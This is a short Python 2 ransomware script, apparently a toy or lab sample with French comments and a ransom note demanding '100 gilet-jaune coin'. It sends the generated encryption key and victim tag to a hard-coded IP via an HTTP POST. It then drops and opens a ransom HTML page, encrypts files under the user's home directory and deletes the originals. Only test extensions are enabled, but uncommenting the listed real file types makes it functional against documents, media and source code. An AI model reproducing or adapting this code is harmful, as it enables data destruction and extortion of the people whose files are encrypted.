import base64, binascii, os, string, random, requests, webbrowser
import subprocess as sp
from cryptography.fernet import Fernet

def tag_generator(size=8, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

home = os.getenv('HOME')
desktop = str(home) + "\\Desktop\\"



key = Fernet.generate_key()
tag =  tag_generator()

exfildata = "TAG: " + str(tag) + " *** " + "KEY: " + str(key) + " *** "

encodeexfildata = base64.b64encode(exfildata)
requests.post("http://10.101.199.255/pouet.php?args="+str(encodeexfildata))


htmlpart1 = """<h1 style="text-align: center;"><span style="color: #ff0000;">Tu viens d'&ecirc;tre pirat&eacute;!!</span></h1>
<p>&nbsp;</p>
<h1 style="text-align: center;">Envoie 100 gilet-jaune coin et le TAG : """

htmlpart2 = """</h1>
<h1 style="text-align: center;">&nbsp;</h1>
<h1 style="text-align: center;">&agrave; <a href="mailto:danslecul@macron.fr">danslecul@macron.fr</a></h1>
<p>&nbsp;</p>"""




htmlpage = str(htmlpart1) + str(tag) + str(htmlpart2)
namehtml = "README -  TAG= " + str(tag) + ".html"
pathNameHtml = str(desktop) + str(namehtml)


fichier = open(str(pathNameHtml), "a")
fichier.write(htmlpage)
fichier.close()

webbrowser.open_new_tab(str(pathNameHtml))





extensions = (
        # '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        '.super', '.testlol', # Fichier imaginaire pour test
        #'.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
        #'.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
        #'.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies

        #'.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
        #'.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', # OpenOffice, Adobe, Latex, Markdown, etc
        #'.yml', '.yaml', '.json', '.xml', '.csv', # structured data
        #'.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images

        #'.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
        #'.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
        #'.java', '.class', '.jar', # java source code
        #'.ps', '.bat', '.vb', # windows based scripts
        #'.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
        #'.go', '.py', '.pyc', '.bf', '.coffee', # other source code files

        #'.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
    )



for root, dirs, files in os.walk(home):
    for file in files:
        if file.endswith(extensions):
            listedfile =(os.path.join(root, file))
            print listedfile 
            fichier = open(listedfile, "rb")
            content = fichier.read()
            #hexfi = (binascii.hexlify(content))
            fichier.close()

            f = Fernet(key)
            token = f.encrypt(str(content))

            #print token

            fichier = open(str(listedfile) + "." + str(tag), "a")
            fichier.write(token)
            fichier.close()

            os.remove(str(listedfile))





if os.path.isfile(str(pathNameHtml)) == False :
    fichier = open(str(pathNameHtml), "a")
    fichier.write(htmlpage)
    fichier.close()


